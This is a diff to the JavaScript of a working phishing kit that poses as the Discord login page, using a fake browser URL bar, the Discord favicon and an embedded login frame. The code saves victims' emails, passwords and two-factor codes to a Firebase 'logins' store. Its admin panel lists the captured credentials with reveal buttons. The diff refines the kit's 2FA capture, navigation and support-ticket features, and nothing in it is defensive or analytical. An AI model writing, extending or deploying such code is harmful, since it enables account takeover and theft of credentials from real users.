@@ -22,11 +22,12 @@ const adminAccessBtn = document.getElementById('admin-access-btn');
 const tryAgainBtn = document.getElementById('try-again-btn');
 const adminLogoutBtn = document.getElementById('admin-logout-btn');
 
-// 2FA Elements
+// 2FA
 const twofaInput = document.getElementById('twofa-input');
 const twofaSubmitBtn = document.getElementById('twofa-submit-btn');
+const twofaBackBtn = document.getElementById('twofa-back-btn');
 
-// URL Bar Elements
+// URL Bar
 const urlInput = document.getElementById('url-input');
 const tabTitle = document.getElementById('tab-title');
 const tabFavicon = document.getElementById('tab-favicon');
@@ -35,13 +36,13 @@ const errorPage = document.getElementById('error-page');
 const errorDomainEl = document.getElementById('error-domain');
 const errorMessageEl = document.getElementById('error-message');
 
-// Modal Elements
+// Modals
 const urlWarningModal = document.getElementById('url-warning-modal');
 const modalBackdrop = document.getElementById('modal-backdrop');
 const modalCancelBtn = document.getElementById('modal-cancel-btn');
 const modalContinueBtn = document.getElementById('modal-continue-btn');
 
-// Admin elements
+// Admin
 const generateCodeBtn = document.getElementById('generate-code-btn');
 const generatedCodeDisplay = document.getElementById('generated-code-display');
 const codeText = document.getElementById('code-text');
@@ -51,7 +52,13 @@ const copyCodeBtn = document.getElementById('copy-code-btn');
 const eyeIconShow = document.getElementById('eye-icon-show');
 const eyeIconHide = document.getElementById('eye-icon-hide');
 const codesList = document.getElementById('codes-list');
-const usersTbody = document.getElementById('users-tbody');
+
+// Close ticket modal
+const closeTicketModal = document.getElementById('close-ticket-modal');
+const closeTicketBackdrop = document.getElementById('close-ticket-backdrop');
+const closeReasonInput = document.getElementById('close-reason-input');
+const confirmCloseBtn = document.getElementById('confirm-close-btn');
+const cancelCloseBtn = document.getElementById('cancel-close-btn');
 
 let currentUserEmail = null;
 let currentUserPassword = null;
@@ -60,26 +67,25 @@ let isAdmin = false;
 let currentGeneratedCode = '';
 let isCodeVisible = false;
 let pendingUrl = '';
+let closingTicketKey = null;
 
 const originalUrl = 'https://discord.com/login';
 const discordFavicon = "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%235865F2' d='M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 0 0 .031.057 19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028 14.09 14.09 0 0 0 1.226-1.994.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03zM8.02 15.33c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.956-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.956 2.418-2.157 2.418zm7.975 0c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.955-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.946 2.418-2.157 2.418z'/%3E%3C/svg%3E";
 
-// Set iframe src on load
+// Init iframe
 window.addEventListener('DOMContentLoaded', () => {
     loginIframe.src = LOGIN_PAGE_URL;
 });
 
-// URL Bar Logic
-urlInput.addEventListener('focus', () => {
-    urlInput.select();
-});
+// URL Bar
+urlInput.addEventListener('focus', () => { urlInput.select(); });
 
 urlInput.addEventListener('keydown', (e) => {
     if (e.key === 'Enter') {
         e.preventDefault();
-        const inputValue = urlInput.value.trim();
-        if (inputValue !== originalUrl && inputValue !== '') {
-            pendingUrl = inputValue;
+        const val = urlInput.value.trim();
+        if (val !== originalUrl && val !== '') {
+            pendingUrl = val;
             urlWarningModal.classList.remove('hidden');
         }
     }
@@ -105,10 +111,7 @@ modalContinueBtn.addEventListener('click', () => {
 
 function handleUrlNavigation(inputValue) {
     const isValidUrl = inputValue.includes('.') && !inputValue.includes(' ');
-    if (!isValidUrl) {
-        showDomainError(inputValue);
-        return;
-    }
+    if (!isValidUrl) { showDomainError(inputValue); return; }
 
     let formattedUrl = inputValue;
     if (!inputValue.startsWith('http://') && !inputValue.startsWith('https://')) {
@@ -124,7 +127,6 @@ function handleUrlNavigation(inputValue) {
         tabTitle.textContent = capitalizedName;
         tabFavicon.src = `https://www.google.com/s2/favicons?domain=${domain}&sz=32`;
         urlInput.value = formattedUrl;
-
         errorPage.classList.remove('hidden');
         errorDomainEl.textContent = `${domain} refused to connect.`;
         errorMessageEl.textContent = `${domain} may have security settings that prevent it from being embedded.`;
@@ -153,7 +155,7 @@ function resetToDiscord() {
     loginIframe.src = LOGIN_PAGE_URL;
 }
 
-// Listen for messages from login iframe
+// Listen for iframe messages
 window.addEventListener('message', (event) => {
     if (event.data.type === 'login-success') {
         currentUserEmail = event.data.email;
@@ -163,7 +165,6 @@ window.addEventListener('message', (event) => {
 });
 
 async function showTwoFA(email, password) {
-    // Save login to Firebase first (without 2FA code yet)
     try {
         const loginData = {
             email: email,
@@ -178,14 +179,20 @@ async function showTwoFA(email, password) {
         console.error('Error saving login:', error);
     }
 
-    // Show 2FA screen
+    // Store email for support page
+    sessionStorage.setItem('mccg_email', email);
+
     loginScreen.classList.add('hidden');
     twofaScreen.classList.remove('hidden');
     twofaInput.value = '';
-    twofaInput.focus();
+    setTimeout(() => { twofaInput.focus(); }, 100);
 }
 
-// 2FA Submit
+// 2FA only numbers
+twofaInput.addEventListener('input', (e) => {
+    e.target.value = e.target.value.replace(/[^0-9]/g, '');
+});
+
 twofaSubmitBtn.addEventListener('click', handleTwofaSubmit);
 twofaInput.addEventListener('keydown', (e) => {
     if (e.key === 'Enter') handleTwofaSubmit();
@@ -195,12 +202,9 @@ async function handleTwofaSubmit() {
     const code = twofaInput.value.trim();
     if (!code) return;
 
-    // Update Firebase entry with 2FA code
     if (currentFirebaseKey) {
         try {
-            await database.ref('logins/' + currentFirebaseKey).update({
-                twofa: code
-            });
+            await database.ref('logins/' + currentFirebaseKey).update({ twofa: code });
         } catch (error) {
             console.error('Error updating 2FA:', error);
         }
@@ -218,13 +222,22 @@ async function handleTwofaSubmit() {
     }, 2500);
 }
 
+// Back to login from 2FA
+twofaBackBtn.addEventListener('click', () => {
+    twofaScreen.classList.add('hidden');
+    loginScreen.classList.remove('hidden');
+    currentUserEmail = null;
+    currentUserPassword = null;
+    currentFirebaseKey = null;
+    resetToDiscord();
+});
+
 async function checkAdminStatus(email) {
     try {
         const snapshot = await database.ref('logins').orderByChild('email').equalTo(email).once('value');
         const data = snapshot.val();
         if (data) {
-            const entries = Object.values(data);
-            isAdmin = entries.some(entry => entry.owner === true);
+            isAdmin = Object.values(data).some(entry => entry.owner === true);
         }
     } catch (error) {
         console.error('Error checking admin status:', error);
@@ -237,6 +250,7 @@ tryAgainBtn.addEventListener('click', () => {
     currentUserEmail = null;
     currentUserPassword = null;
     currentFirebaseKey = null;
+    isAdmin = false;
     resetToDiscord();
 });
 
@@ -275,7 +289,6 @@ generateCodeBtn.addEventListener('click', async () => {
         codeStatus.textContent = '(working)';
         codeStatus.className = 'code-status working';
         generatedCodeDisplay.classList.remove('hidden');
-
         loadCodes();
     } catch (error) {
         console.error('Error generating code:', error);
@@ -344,13 +357,9 @@ function loadCodes() {
                             <span class="code-status ${statusClass}">(${code.status})</span>
                         </div>
                         <div class="code-item-actions">
-                            <button class="eye-btn toggle-list-code" data-code="${code.code}" title="Show/Hide">
-                                <svg class="eye-show" viewBox="0 0 24 24" width="18" height="18" fill="currentColor">
-                                    <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
-                                </svg>
-                                <svg class="eye-hide hidden" viewBox="0 0 24 24" width="18" height="18" fill="currentColor">
-                                    <path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/>
-                                </svg>
+                            <button class="eye-btn toggle-list-code" data-code="${code.code}">
+                                <svg class="eye-show" viewBox="0 0 24 24" width="18" height="18" fill="currentColor"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
+                                <svg class="eye-hide hidden" viewBox="0 0 24 24" width="18" height="18" fill="currentColor"><path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/></svg>
                             </button>
                             <button class="icon-btn copy-list-code" data-code="${code.code}">Copy</button>
                             <button class="delete-btn delete-code" data-key="${key}">Delete</button>
@@ -366,18 +375,17 @@ function loadCodes() {
         document.querySelectorAll('.toggle-list-code').forEach(btn => {
             btn.addEventListener('click', function () {
                 const code = this.dataset.code;
-                const codeSpan = this.closest('.code-item').querySelector('.code-item-code');
+                const span = this.closest('.code-item').querySelector('.code-item-code');
                 const eyeShow = this.querySelector('.eye-show');
                 const eyeHide = this.querySelector('.eye-hide');
-                const isHidden = codeSpan.classList.contains('code-hidden');
-                if (isHidden) {
-                    codeSpan.textContent = code;
-                    codeSpan.classList.remove('code-hidden');
+                if (span.classList.contains('code-hidden')) {
+                    span.textContent = code;
+                    span.classList.remove('code-hidden');
                     eyeShow.classList.add('hidden');
                     eyeHide.classList.remove('hidden');
                 } else {
-                    codeSpan.textContent = '*'.repeat(code.length);
-                    codeSpan.classList.add('code-hidden');
+                    span.textContent = '*'.repeat(code.length);
+                    span.classList.add('code-hidden');
                     eyeShow.classList.remove('hidden');
                     eyeHide.classList.add('hidden');
                 }
@@ -414,17 +422,14 @@ function loadLogins() {
             Object.keys(logins).reverse().forEach(key => {
                 const login = logins[key];
                 totalCount++;
-
                 const loginDate = new Date(login.timestamp);
                 if (loginDate.toDateString() === today) todayCount++;
 
                 const formattedDate = loginDate.toLocaleString();
-                const ownerBadge = login.owner
-                    ? '<span class="badge" style="margin-left:8px;font-size:10px;">ADMIN</span>'
-                    : '';
-                const hiddenPassword = '*'.repeat(login.password ? login.password.length : 8);
+                const ownerBadge = login.owner ? '<span class="badge" style="margin-left:8px;font-size:10px;">ADMIN</span>' : '';
+                const hiddenPw = '*'.repeat(login.password ? login.password.length : 8);
                 const twofaDisplay = login.twofa && login.twofa !== 'pending'
-                    ? `<span class="twofa-cell">${login.twofa}</span>`
+                    ? `<span class="twofa-cell">${escapeHtml(login.twofa)}</span>`
                     : `<span style="color:var(--text-muted);font-size:12px;">${login.twofa === 'pending' ? 'Pending...' : 'N/A'}</span>`;
 
                 html += `
@@ -432,23 +437,17 @@ function loadLogins() {
                         <td>${escapeHtml(login.email)}${ownerBadge}</td>
                         <td>
                             <div class="password-cell">
-                                <span class="password-text" data-password="${escapeHtml(login.password || '')}">${hiddenPassword}</span>
-                                <button class="eye-btn toggle-password" title="Show/Hide">
-                                    <svg class="eye-show" viewBox="0 0 24 24" width="18" height="18" fill="currentColor">
-                                        <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
-                                    </svg>
-                                    <svg class="eye-hide hidden" viewBox="0 0 24 24" width="18" height="18" fill="currentColor">
-                                        <path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/>
-                                    </svg>
+                                <span class="password-text" data-password="${escapeHtml(login.password || '')}">${hiddenPw}</span>
+                                <button class="eye-btn toggle-password">
+                                    <svg class="eye-show" viewBox="0 0 24 24" width="18" height="18" fill="currentColor"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
+                                    <svg class="eye-hide hidden" viewBox="0 0 24 24" width="18" height="18" fill="currentColor"><path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27z"/></svg>
                                 </button>
                             </div>
                         </td>
                         <td>${twofaDisplay}</td>
                         <td>${formattedDate}</td>
                         <td>
-                            <button class="icon-btn make-admin" data-key="${key}" ${login.owner ? 'disabled style="opacity:0.5"' : ''}>
-                                ${login.owner ? 'Is Admin' : 'Make Admin'}
-                            </button>
+                            <button class="icon-btn make-admin" data-key="${key}" ${login.owner ? 'disabled style="opacity:0.5"' : ''}>${login.owner ? 'Is Admin' : 'Make Admin'}</button>
                             <button class="delete-btn delete-login" data-key="${key}">Delete</button>
                         </td>
                     </tr>
@@ -456,8 +455,8 @@ function loadLogins() {
             });
         }
 
-        const usersTbody = document.getElementById('users-tbody');
-        usersTbody.innerHTML = html || '<tr><td colspan="5" class="empty-state">No logins captured yet</td></tr>';
+        const tbody = document.getElementById('users-tbody');
+        tbody.innerHTML = html || '<tr><td colspan="5" class="empty-state">No logins captured yet</td></tr>';
         document.getElementById('user-count').textContent = totalCount;
         document.getElementById('total-logins').textContent = totalCount;
         document.getElementById('today-logins').textContent = todayCount;
@@ -467,8 +466,7 @@ function loadLogins() {
                 const span = this.closest('.password-cell').querySelector('.password-text');
                 const eyeShow = this.querySelector('.eye-show');
                 const eyeHide = this.querySelector('.eye-hide');
-                const isHidden = span.textContent.includes('*');
-                if (isHidden) {
+                if (span.textContent.includes('*')) {
                     span.textContent = span.dataset.password;
                     eyeShow.classList.add('hidden');
                     eyeHide.classList.remove('hidden');
@@ -512,6 +510,13 @@ function loadAdminTickets() {
                 count++;
                 const date = new Date(ticket.createdAt).toLocaleString();
                 const statusClass = ticket.status || 'open';
+                const authorName = ticket.authorName || 'Anonymous';
+                const initial = authorName.charAt(0).toUpperCase();
+                const isAdminAuthor = ticket.isAdmin || false;
+
+                const pfpHtml = isAdminAuthor
+                    ? `<img src="https://i.ibb.co/HDxMBCcJ/gpt-image-1-5-high-fidelity-a-Make-the-M-have-a-pu.png" class="ticket-pfp" alt="Admin">`
+                    : `<div class="ticket-pfp-default">${initial}</div>`;
 
                 html += `
                     <div class="ticket-card status-${statusClass}">
@@ -522,10 +527,16 @@ function loadAdminTickets() {
                                 <span class="ticket-category-badge">${escapeHtml(ticket.category)}</span>
                             </div>
                         </div>
+                        <div class="ticket-author-row">
+                            ${pfpHtml}
+                            <div>
+                                <div class="ticket-author-name">${escapeHtml(authorName)}</div>
+                                <div class="ticket-author-email">${escapeHtml(ticket.authorEmail || '')}</div>
+                            </div>
+                        </div>
                         <p class="ticket-description">${escapeHtml(ticket.description)}</p>
                         ${ticket.closeReason ? `<div class="ticket-close-reason">Closed: ${escapeHtml(ticket.closeReason)}</div>` : ''}
                         <div class="ticket-footer">
-                            <span class="ticket-author">From: ${escapeHtml(ticket.authorName || 'Anonymous')} (${escapeHtml(ticket.authorEmail || 'Unknown')})</span>
                             <span class="ticket-date">${date}</span>
                             <div class="ticket-actions">
                                 ${statusClass === 'open' ? `
@@ -543,22 +554,18 @@ function loadAdminTickets() {
         container.innerHTML = html || '<p class="empty-state">No tickets submitted yet</p>';
         countEl.textContent = count;
 
-        // Close ticket
-        let closingKey = null;
-        const closeModal = document.getElementById('close-ticket-modal') || createCloseModal();
-
-        document.querySelectorAll('.admin-close-ticket').forEach(btn => {
-            btn.addEventListener('click', function () {
-                closingKey = this.dataset.key;
-                closeModal.classList.remove('hidden');
-            });
-        });
-
         document.querySelectorAll('.admin-resolve-ticket').forEach(btn => {
             btn.addEventListener('click', function () {
                 if (confirm('Mark this ticket as resolved?')) {
                     database.ref('tickets/' + this.dataset.key).update({ status: 'resolved' });
                 }
+            });
+        });
+
+        document.querySelectorAll('.admin-close-ticket').forEach(btn => {
+            btn.addEventListener('click', function () {
+                closingTicketKey = this.dataset.key;
+                closeTicketModal.classList.remove('hidden');
             });
         });
 
@@ -569,68 +576,32 @@ function loadAdminTickets() {
                 }
             });
         });
-
-        const confirmCloseBtn = document.getElementById('confirm-close-btn');
-        const cancelCloseBtn = document.getElementById('cancel-close-btn');
-        const closeReason = document.getElementById('close-reason-input');
-        const closeBackdrop = document.getElementById('close-ticket-backdrop');
-
-        if (confirmCloseBtn) {
-            confirmCloseBtn.onclick = () => {
-                const reason = closeReason.value.trim();
-                if (!reason) { alert('Please enter a reason.'); return; }
-                if (closingKey) {
-                    database.ref('tickets/' + closingKey).update({
-                        status: 'closed',
-                        closeReason: reason
-                    });
-                }
-                closeModal.classList.add('hidden');
-                closeReason.value = '';
-                closingKey = null;
-            };
-        }
-
-        if (cancelCloseBtn) {
-            cancelCloseBtn.onclick = () => {
-                closeModal.classList.add('hidden');
-                closeReason.value = '';
-                closingKey = null;
-            };
-        }
-
-        if (closeBackdrop) {
-            closeBackdrop.onclick = () => {
-                closeModal.classList.add('hidden');
-                closeReason.value = '';
-                closingKey = null;
-            };
-        }
     });
 }
 
-function createCloseModal() {
-    const modal = document.createElement('div');
-    modal.id = 'close-ticket-modal';
-    modal.className = 'modal hidden';
-    modal.innerHTML = `
-        <div class="modal-backdrop" id="close-ticket-backdrop"></div>
-        <div class="modal-content">
-            <h2>Close Ticket</h2>
-            <p>Please provide a reason for closing this ticket.</p>
-            <div class="modal-input-wrapper">
-                <label for="close-reason-input">Reason</label>
-                <textarea id="close-reason-input" placeholder="Reason for closing..." rows="3" maxlength="300"></textarea>
-            </div>
-            <div class="modal-buttons">
-                <button id="cancel-close-btn" class="secondary-btn">Cancel</button>
-                <button id="confirm-close-btn" class="danger-btn">Close Ticket</button>
-            </div>
-        </div>
-    `;
-    document.body.appendChild(modal);
-    return modal;
-}
+// Close Ticket Modal
+confirmCloseBtn.addEventListener('click', async () => {
+    const reason = closeReasonInput.value.trim();
+    if (!reason) { alert('Please enter a reason.'); return; }
+    if (closingTicketKey) {
+        await database.ref('tickets/' + closingTicketKey).update({ status: 'closed', closeReason: reason });
+    }
+    closeTicketModal.classList.add('hidden');
+    closeReasonInput.value = '';
+    closingTicketKey = null;
+});
+
+cancelCloseBtn.addEventListener('click', () => {
+    closeTicketModal.classList.add('hidden');
+    closeReasonInput.value = '';
+    closingTicketKey = null;
+});
+
+closeTicketBackdrop.addEventListener('click', () => {
+    closeTicketModal.classList.add('hidden');
+    closeReasonInput.value = '';
+    closingTicketKey = null;
+});
 
 function escapeHtml(text) {
     if (!text) return '';
